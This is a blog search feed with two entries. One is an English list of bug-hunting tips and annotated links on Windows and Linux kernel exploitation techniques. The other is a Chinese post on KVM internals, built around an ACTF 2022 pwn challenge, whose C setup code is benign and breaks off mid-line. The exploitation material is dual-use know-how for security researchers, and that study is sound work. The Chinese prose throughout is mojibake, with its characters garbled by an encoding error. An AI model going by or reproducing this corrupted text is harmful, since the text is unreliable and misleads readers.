<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Bug Hunter</title>
      <link href="/2022/08/11/bug-hunter/"/>
      <url>/2022/08/11/bug-hunter/</url>
      
        <content type="html"><![CDATA[<h1 id="Bug-Hunting-in-Hard-Targets"><a href="#Bug-Hunting-in-Hard-Targets" class="headerlink" title="Bug Hunting in Hard Targets"></a>Bug Hunting in Hard Targets</h1><ol><li>Developer mindset vs Adversarial mindset - Code review as a bug hunter is often different from code reviewing as part of feature change. As a bug hunter you are only focusing on how to circumvent a control or use in a way it was not intended. Learning this mindset is key</li><li>Going Deep vs Going Wide - Researching a target there is a trade off between going deep and going wide. If you have no knowledge then going wide helps to discover potential weak areas and build up a mental model. At some point it becomes important to focus down and refine</li><li>Target Biases - Its common to think because something is well established then there will be less bugs lurking there. However, most software is evolving and new features are constant being added. This new code is often a really good source of bugs.</li><li>Fuzzing Enhancements - As code moves on over time, developers need to create test code. This means that often this new code misses test coverage or has no tests at all. Binary diffing, API change logs and software update analysis are a great way to extend fuzzer coverage.</li><li>Code&#x2F;binary review lead fuzzing - It can be very challenging to spot certain bugs using only code review or binary analysis. Combing the approach allows to identify complexity and focus fuzzing to weak areas which may lead to vulns you would have not spotted</li><li>Variant Analysis - As a researcher most of the bugs you find will not be particularly novel and are generally abstractions of a common vulnerability pattern. Knowing how to recognise these patterns and integrating into your toolset to allow faster identification is a must</li><li>Research Tracking - In the area you are researching it is important to keep up-to date on published material. As new attack surfaces are unearthed or new vulnerability classes are identified then taking this knowledge and integrating it into your tooling is important.</li><li>Collaboration - You can get quite far solo in bug hunting, however being able to work in a team allows effective use of the team members specialisation and allows for distribution of work. It helps with motivation on the VR emotional rollercoaster when failure is common.</li><li>Bug Tracking - Whilst going for the most impact as possible is the goal, reaching that goal may require many other lesser impact vulnerabilities chained together. As you are performing your research it is important to make notes of literally anything of potential value.</li><li>Target Knowledge Base - Whilst you are doing this research and afterwards it is important to maintain a target knowledge based. Building on existing knowledge is much easier than coming from zero knowledge of the target. Really helps if you switch between targets lots.</li></ol><h1 id="Windows-Kernel-Exploitation"><a href="#Windows-Kernel-Exploitation" class="headerlink" title="Windows Kernel Exploitation"></a>Windows Kernel Exploitation</h1><ol><li><p>The most complete and recent overview of the Windows Kernel Segment Heap from an exploitation perspective.</p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p></li><li><p>Two articles I wrote on what I assumed was a similar WNF technique seen in the wild to understand how this subsystem could have been abused and the vuln</p><p><a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) - Part 1</a></p><p><a href="https://research.nccgroup.com/2021/08/17/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/">CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) - Part 2</a></p></li><li><p>A use-after-free in clfs.sys, then uses a similar WNF technique as explained in the previous tweet to enable better primitives and techniques mentioned in Scoop the Windows 10 Pool to perform heap grooming. Data only attack escalation</p><p><a href="https://blog.exodusintel.com/2022/03/10/exploiting-a-use-after-free-in-windows-common-logging-file-system-clfs/">Exploiting a use-after-free in Windows Common Logging File System (CLFS) - Exodus Intelligence</a></p></li><li><p>A novel post exploitation primitive unique to Windows 11 22H2+ which can turn an arbitrary write&#x2F;inc into full read and write of kernel memory by abusing I&#x2F;O Ring and its operations. A POC was also released</p><p><a href="https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/">One I&#x2F;O Ring to Rule Them All: A Full Read&#x2F;Write Exploit Primitive on Windows 11</a></p><p><a href="https://github.com/yardenshafir/IoRingReadWritePrimitive">https://github.com/yardenshafir/IoRingReadWritePrimitive</a></p></li><li><p>Win32k has been a huge source of kernel bugs over the years. This talk goes into more than 15 bugs _arkon found and the novel bug class, attack techniques and mitigation by MSFT.</p></li><li><p>Investigates the bug class of arbitrary kernel pointer read (i.e. pointers read from attacker controlled input do not point to userspace). Investigates the true impact (i.e. DOS or second order info leak only?) or code exec &#x2F; LPE</p><p><a href="https://msrc-blog.microsoft.com/2022/03/22/exploring-a-new-class-of-kernel-exploit-primitive/">Exploring a New Class of Kernel Exploit Primitive</a></p></li><li><p>HCVI aims to mitigate an attacker being able too execute unsigned code within the Windows Kernel. 33y0re looks how HVCI affects a typical kernel exploit and shows a way which with arb read&#x2F;write can call kernel functions without triggering HVCI&#x2F;kCFG</p><p><a href="https://connormcgarr.github.io/hvci/">Exploit Development: No Code Execution? No Problem! Living The Age of VBS, HVCI, and Kernel CFG</a></p></li><li><p>In these two a trick to trap access to virtual memory which could be used exploiting certain types of bugs and another on hunting for bugs within Mini-Filter drivers.</p><p><a href="https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html">Windows Exploitation Tricks: Trapping Virtual Memory Access</a></p><p><a href="https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html">Hunting for Bugs in Windows Mini-Filter Drivers</a></p></li><li><p>Actually looking at what Windows vulns are being exploited within the wild (in this case font bugs and CSRSS bug analysis) provides defenders with insights on where to focus their mitigation and detection efforts.</p><p><a href="https://googleprojectzero.blogspot.com/2021/01/in-wild-series-windows-exploits.html">In-the-Wild Series: Windows Exploits</a></p></li><li><p>by rohitwas on finishing off KASLR where previously KUSER_SHARED_DATA was always mapped at a fixed page of memory within the kernel. The post shows strengthening KASLR in Windows by mitigating the last remaining blind-write target RCE could use</p><p><a href="https://msrc-blog.microsoft.com/2022/04/05/randomizing-the-kuser_shared_data-structure-on-windows/">Randomizing the KUSER_SHARED_DATA Structure on Windows</a></p></li></ol><h1 id="Linux-Vulnerability-Research"><a href="#Linux-Vulnerability-Research" class="headerlink" title="Linux Vulnerability Research"></a>Linux Vulnerability Research</h1><ol><li><p>Understanding and Improving Linux Kernel Exploit Reliability</p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf</a></p></li><li><p>userfaultfd technique is dead on most Linux distros due to vm.unprivileged_userfaultfd. Fuse has come through as a good replacement for this technique.</p><p><a href="https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">Put an io_uring on it: Exploiting the Linux Kernel</a></p><p><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Googleâ€™s KCTF Containers</a></p></li><li><p>Syzkaller is a game changer in kernel. Thereâ€™s a few things to say 1) Even existing publics grammars can find bugs when targeted at areas. 2) Extending coverage is a quick way to find bugs 3) N-day often sits around in <a href="https://syzkaller.appspot.com/upstream">https://syzkaller.appspot.com/upstream</a></p><p><a href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions.md">syzkaller&#x2F;syscall_descriptions.md at master Â· google&#x2F;syzkaller</a></p><p><a href="https://groups.google.com/g/syzkaller/c/YZGN8Ggb_LY/m/h1_uxIEJAgAJ">Tutorial on describing new subsystems</a></p><p><a href="https://xairy.io/articles/syzkaller-external-network">ğŸ” Looking for Remote Code Execution bugs in the Linux kernel</a></p><p><a href="https://www.collabora.com/news-and-blog/blog/2020/05/12/using-syzkaller-fuzzing-your-changes/">Using syzkaller, part 3: Fuzzing your changes</a></p><p><a href="https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/syzkaller_crash_demo.md">Debian-GNU-Linux-Profiles&#x2F;syzkaller_crash_demo.md at master Â· hardenedlinux&#x2F;Debian-GNU-Linux-Profiles</a></p><p><a href="https://seclists.org/oss-sec/2022/q2/164?utm_source=dlvr.it&utm_medium=twitter">CVE-2022-1972: out-of-bound write in Linux netfilter subsystem leads to local privilege escalation</a></p></li><li><p>So N-day often just sitting around.. KCTF encourages researchers to triage existing bugs and develop new techniques to bypass existing mitigations</p><p><a href="https://security.googleblog.com/2021/11/trick-treat-paying-leets-and-sweets-for.html">Trick &amp; Treat! ğŸƒ Paying Leets and Sweets for Linux Kernel privescs and k8s escapes</a></p><p>both 0-day&#x2F;N-day. As a researcher you can learn a lot from past bugs:</p><p><a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml">public kCTF Responses - Google Drive</a></p></li><li><p>Keeping on top of mitigations in your head is hard. Especially if you are working on multiple platforms.</p><p><a href="https://github.com/nccgroup/exploit_mitigations">https://github.com/nccgroup/exploit_mitigations</a></p><p>to try to help track these. Really early days, but any contributions appreciated!</p></li><li><p>Finding the correct size structures with elements you want to control at certain offsets with them is tedious and time consuming. CodeQL massively helps speed up this process.mmolgtm article</p><p><a href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">One day short of a full chain: Part 1 - Android Kernel arbitrary code execution</a></p><p>shows a query which can be used for this.</p></li><li><p>The msg_msg technique which has been a favorite by exploit writes used in</p><p><a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185 - Winning a $31337 Bounty after Pwning Ubuntu and Escaping Googleâ€™s KCTF Containers</a></p><p><a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">CVE-2021-22555: Turning \x00\x00 into 10000$</a></p><p><a href="https://nickgregory.me/post/2022/03/12/cve-2022-25636/">The Discovery and Exploitation of CVE-2022-25636</a></p><p>becomes less useful in 5.14 when GFP_KERNEL_ACCOUNT end up in kmalloc-cg-* caches and your vulnerable object is not.</p></li><li><p>Talking of kmalloc cacheâ€™s, cross-cache attacks are a thing and can be used when its not possible to find an interesting object within your initial target cache. Markak_ describes this and other factors to consider when evaluating AUTOSLAB</p><p><a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game">How AUTOSLAB Changes the Memory Unsafety Game</a></p></li><li><p>This list wouldnâ€™t be complete andreyknvl and a13xp0p0v with linkersec and</p><p><a href="https://github.com/xairy/linux-kernel-exploitation">https://github.com/xairy/linux-kernel-exploitation</a></p><p>which goes into way more things going back over the years.</p></li><li><p>Finally, if this kind of research interests you! My team at nccgroupinfosec position open currently at</p><p><a href="https://nccgroup.wd3.myworkdayjobs.com/en-US/NCC_Group/job/UK-Remote/Exploit-Developer_R6065">Exploit Developer</a></p></li></ol><h1 id="macOS-vulnerability-research"><a href="#macOS-vulnerability-research" class="headerlink" title="macOS vulnerability research"></a>macOS vulnerability research</h1><p><a href="https://twitter.com/alexjplaskett/status/1472874802037862407">Alex Plaskett on Twitter: â€œ1&#x2F;18 As 2021 is starting to come towards and end, now seems to be good time to look back at all the great macOS vulnerability research &#x2F; exploit development published during the year! Tried to keep to macOS mainly but obviously thereâ€™s some crossover with iOS research too. ğŸ§µ &#x2F; Twitterâ€</a></p><h1 id="Vulnerability-Research-CVs"><a href="#Vulnerability-Research-CVs" class="headerlink" title="Vulnerability Research CVs"></a>Vulnerability Research CVs</h1><p><a href="https://twitter.com/alexjplaskett/status/1552600067231694849">Alex Plaskett on Twitter: â€œ1&#x2F; As someone who has reviewed hundreds of CVs for job applications in the past, I just want to highlight some personal tips for vulnerability researchers in order to maximise their applications (i.e. outside typical career history and education). ğŸ§µ pic.twitter.com&#x2F;S4yEHzHXVn &#x2F; Twitterâ€</a></p><h1 id="Impactful-books"><a href="#Impactful-books" class="headerlink" title="Impactful books"></a>Impactful books</h1><p><a href="https://twitter.com/alexjplaskett/status/1551173688661536769">Alex Plaskett on Twitter: â€œI am often asked what books have had the most impact to me in security. This is a really tough question as I have read so many, however, here are some I have have on my shelf and why they were important to meğŸ‘‡ pic.twitter.com&#x2F;Uk5PbXa4gO &#x2F; Twitterâ€</a></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://twitter.com/alexjplaskett">https://twitter.com/alexjplaskett</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»ä¸€é“CTFé¢˜ç›®å­¦ä¹ KVM</title>
      <link href="/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/"/>
      <url>/2022/07/29/cong-yi-dao-ctf-ti-mu-xue-xi-kvm/</url>
      
        <content type="html"><![CDATA[<p>KVM å…¨ç§°æ˜¯åŸºäºå†…æ ¸çš„è™šæ‹Ÿæœºï¼ˆKernel-based Virtual Machineï¼‰ï¼Œå®ƒæ˜¯Linux çš„ä¸€ä¸ªå†…æ ¸æ¨¡å—ï¼ŒKVMåŸºäºè™šæ‹ŸåŒ–æ‰©å±•ï¼ˆIntel VT æˆ–è€… AMD-Vï¼‰çš„ X86 ç¡¬ä»¶çš„å¼€æºçš„ Linux åŸç”Ÿçš„å…¨è™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆã€‚</p><p>KVM æœ¬èº«ä¸æ‰§è¡Œä»»ä½•ç¡¬ä»¶æ¨¡æ‹Ÿï¼Œéœ€è¦ç”¨æˆ·ç©ºé—´ç¨‹åºï¼ˆQEMUï¼‰é€šè¿‡ <strong>&#x2F;dev&#x2F;kvm</strong> æ¥å£è®¾ç½®ä¸€ä¸ªå®¢æˆ·æœºè™šæ‹ŸæœåŠ¡å™¨çš„åœ°å€ç©ºé—´ï¼Œå‘å®ƒæä¾›æ¨¡æ‹Ÿ I&#x2F;Oï¼Œå¹¶å°†å®ƒçš„è§†é¢‘æ˜¾ç¤ºæ˜ å°„å›å®¿ä¸»çš„æ˜¾ç¤ºå±ã€‚</p><h1 id="é¢˜ç›®é€†å‘åˆ†æ"><a href="#é¢˜ç›®é€†å‘åˆ†æ" class="headerlink" title="é¢˜ç›®é€†å‘åˆ†æ"></a>é¢˜ç›®é€†å‘åˆ†æ</h1><p>é¢˜ç›®æ¥æºäºACTF 2022çš„ä¸€é“PWNé¢˜ï¼Œç»™å‡ºå››ä¸ªæ–‡ä»¶ï¼ŒäºŒè¿›åˆ¶ç¨‹åºåœ¨binæ–‡ä»¶å¤¹ä¸‹ï¼Œå…¶ä½™éƒ½æ˜¯é¢˜ç›®éƒ¨ç½²æ‰€ç”¨åˆ°çš„æ–‡ä»¶ï¼Œå¯ä»¥ç”¨dockeræ­å»ºé¢˜ç›®ï¼Œåé¢ä¼šè®²åˆ°ï¼š</p><pre class="line-numbers language-none"><code class="language-none">â”œâ”€â”€ binâ”‚   â”œâ”€â”€ mykvmâ”œâ”€â”€ ctf.xinetdâ”œâ”€â”€ Dockerfileâ””â”€â”€ start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶é€»è¾‘ï¼Œå‘ç°ä»£ç é‡å¹¶ä¸å¤§ï¼Œé€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181539182.png" alt="image-20220629181539182">åœ¨å‡½æ•°sub_400B92ä¸­ï¼Œæœ‰å¾ˆå¤šioctlæ“ä½œ <strong>&#x2F;dev&#x2F;kvm</strong> è®¾å¤‡æ–‡ä»¶ï¼Œä½†è¿˜ä¸çŸ¥é“åˆ°åº•æ˜¯è¯·æ±‚äº†å“ªç§æ¥å£å®ç°äº†å“ªç§åŠŸèƒ½ï¼š</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181615926.png" alt="image-20220629181615926">è¿™é‡Œéœ€è¦äº†è§£ä¸€ä¸‹KVMçš„å®ç°ã€‚</p><h1 id="KVMå®ç°"><a href="#KVMå®ç°" class="headerlink" title="KVMå®ç°"></a>KVMå®ç°</h1><p>GitHubæœ‰ä¸¤ä¸ªç®€æ˜“çš„KVMä¾‹å­ä¾›å‚è€ƒï¼š</p><p><a href="https://github.com/dpw/kvm-hello-world">https://github.com/dpw/kvm-hello-world</a></p><p><a href="https://github.com/kvmtool/kvmtool">https://github.com/kvmtool/kvmtool</a></p><p>é˜…è¯»æºç åï¼Œæ€»ç»“å‡ºåœ¨ä¸»æœºåˆ›å»ºä¸€ä¸ªKVMçš„åŸºæœ¬æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>æ‰“å¼€KVMè®¾å¤‡</li><li>åˆ›å»ºVM</li><li>ä¸ºGuestè®¾ç½®å†…å­˜</li><li>åˆ›å»ºè™šæ‹ŸCPU</li><li>ä¸ºvCPUè®¾ç½®å†…å­˜</li><li>å°†æ±‡ç¼–ä»£ç æ”¾è¿›ç”¨æˆ·åŒºåŸŸï¼Œè®¾ç½®vCPUçš„å¯„å­˜å™¨</li><li>è¿è¡Œå’Œå¤„ç†é€€å‡º</li></ol><p>ä¸‹é¢åˆ†æ­¥éª¤ä»‹ç»ã€‚</p><h2 id="step-1-3"><a href="#step-1-3" class="headerlink" title="step 1-3"></a>step 1-3</h2><p>æ‰“å¼€KVMè®¾å¤‡ï¼Œåˆ›å»ºVMï¼Œè®¾ç½®Guestå†…å­˜ã€‚å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// step 1, open /dev/kvm</span>  <span class="token keyword">int</span> kvmfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kvm"</span><span class="token punctuation">,</span> O_RDWR<span class="token operator">|</span>O_CLOEXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>kvmfd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"failed to open /dev/kvm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 2, create VM</span>  <span class="token keyword">int</span> vmfd <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>kvmfd<span class="token punctuation">,</span> KVM_CREATE_VM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 3, set up user memory region</span>  <span class="token class-name">size_t</span> mem_size <span class="token operator">=</span> <span class="token number">0x40000000</span><span class="token punctuation">;</span>           <span class="token comment">// size of user memory you want to assign</span>  <span class="token keyword">void</span> <span class="token operator">*</span>mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mem_size<span class="token punctuation">,</span> PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token punctuation">,</span>                   MAP_SHARED<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> user_entry <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>mem <span class="token operator">+</span> user_entry<span class="token punctuation">)</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> code_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_userspace_memory_region</span> region <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span>slot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>guest_phys_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>memory_size <span class="token operator">=</span> mem_size<span class="token punctuation">,</span>    <span class="token punctuation">.</span>userspace_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>mem  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vmfd<span class="token punctuation">,</span> KVM_SET_USER_MEMORY_REGION<span class="token punctuation">,</span> <span class="token operator">&amp;</span>region<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* end of step 3 */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šä»£ç åˆ›å»ºä¸€ä¸ªVMï¼Œ<code>mmap</code>ä¸ºVMåˆ†é…0x40000000(1GB)å¤§å°ï¼Œè®¾ç½®<code>user_entry</code>ä¸º0ï¼Œå°†æ±‡ç¼–æ”¾åœ¨ç¬¬ä¸€é¡µï¼ŒGuestå°†ä»è¯¥åœ°å€å¼€å§‹æ‰§è¡Œã€‚</p><h2 id="step-4-6"><a href="#step-4-6" class="headerlink" title="step 4-6"></a>step 4-6</h2><p>åˆ›å»ºè™šæ‹ŸCPUï¼Œä¸ºvCPUè®¾ç½®å†…å­˜ï¼Œå°†æ±‡ç¼–ä»£ç æ”¾è¿›ç”¨æˆ·åŒºåŸŸã€‚å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* step 4~6, åˆ›å»ºå’Œè®¾ç½® vCPU */</span><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">/* step 1-3 ... */</span>  <span class="token comment">// step 4, create vCPU</span>  <span class="token keyword">int</span> vcpufd <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>vmfd<span class="token punctuation">,</span> KVM_CREATE_VCPU<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 5, set up memory for vCPU</span>  <span class="token class-name">size_t</span> vcpu_mmap_size <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>kvmfd<span class="token punctuation">,</span> KVM_GET_VCPU_MMAP_SIZE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_run</span><span class="token operator">*</span> run <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kvm_run</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> vcpu_mmap_size<span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> vcpufd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// step 6, set up vCPU's registers</span>  <span class="token comment">/* standard registers include general-purpose registers and flags */</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_regs</span> regs<span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_GET_REGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span>  regs<span class="token punctuation">.</span>rip <span class="token operator">=</span> user_entry<span class="token punctuation">;</span>  regs<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token number">0x200000</span><span class="token punctuation">;</span> <span class="token comment">// stack address</span>  regs<span class="token punctuation">.</span>rflags <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">;</span> <span class="token comment">// in x86 the 0x2 bit should always be set</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_SET_REGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set registers</span>  <span class="token comment">/* special registers include segment registers */</span>  <span class="token keyword">struct</span> <span class="token class-name">kvm_sregs</span> sregs<span class="token punctuation">;</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_GET_SREGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sregs<span class="token punctuation">)</span><span class="token punctuation">;</span>  sregs<span class="token punctuation">.</span>cs<span class="token punctuation">.</span>base <span class="token operator">=</span> sregs<span class="token punctuation">.</span>cs<span class="token punctuation">.</span>selector <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// let base of code segment equal to zero</span>  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_SET_SREGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sregs<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// not finished ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šä»£ç åˆ›å»ºvCPUï¼Œè®¾ç½®å¯„å­˜å™¨ï¼Œæ¯ä¸ª<code>kvm_run</code>ç»“æ„å¯¹åº”ä¸€ä¸ªvCPUï¼Œæ¯ä¸ªVMå¯åˆ›å»ºå¤šä¸ªvCPUã€‚vCPUåˆ›å»ºåæ‰§è¡Œäºå®æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½æ‰§è¡Œ16ä½æ±‡ç¼–ä»£ç ï¼Œå¦‚æœéœ€è¦æ‰§è¡Œ32ä½æˆ–64ä½ï¼Œåˆ™è¿˜éœ€è¦è®¾ç½®é¡µè¡¨ã€‚</p><h2 id="step-7"><a href="#step-7" class="headerlink" title="step 7"></a>step 7</h2><p>è¿è¡Œå’Œå¤„ç†é€€å‡ºã€‚å®ç°ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* step 7 */</span><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* ... step 1~6 */</span>  <span class="token comment">// step 7, execute vm and handle exit reason</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_RUN<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>run<span class="token operator">-></span>exit_reason<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> KVM_EXIT_HLT<span class="token operator">:</span>      <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"KVM_EXIT_HLT"</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_IO<span class="token operator">:</span>      <span class="token comment">/* TODO: check port and direction here */</span>      <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>run<span class="token punctuation">)</span> <span class="token operator">+</span> run<span class="token operator">-></span>io<span class="token punctuation">.</span>data_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> KVM_EXIT_FAIL_ENTRY<span class="token operator">:</span>      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 